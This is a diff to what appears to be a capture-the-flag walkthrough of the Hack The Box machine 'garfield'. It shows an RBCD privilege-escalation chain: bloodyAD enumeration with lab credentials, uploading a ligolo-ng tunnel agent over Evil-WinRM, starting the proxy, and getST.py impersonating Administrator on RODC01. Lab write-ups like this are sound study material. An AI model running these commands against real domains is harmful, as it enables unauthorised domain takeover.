@@ -291,7 +291,7 @@ This user is now compromised!
 
 I have some outbound object control
 
-# RBCD
+# RBCD leads to admin on the `RODC01`
 
 ```python
 ❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' get writable --detail
@@ -356,7 +356,39 @@ But in order to request the service ticket i need to be able to reach the machin
 
 As seen here only in a remote session can i reach the `RODC01`
 
+```python
+*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> upload /home/kali/htb/garfield/agent.exe .
+```
 
+Ill upload the agent
+
+```python
+❯❯❯ sudo ./proxy -selfcert                                                  
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0001] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.2
+
+ligolo-ng »
+```
+
+Ill then start the proxy on my system
+
+```python
+
+```
 
 ```python
 ❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "$DC_IP" 'garfield.htb/l.wilson_adm:Password123!'
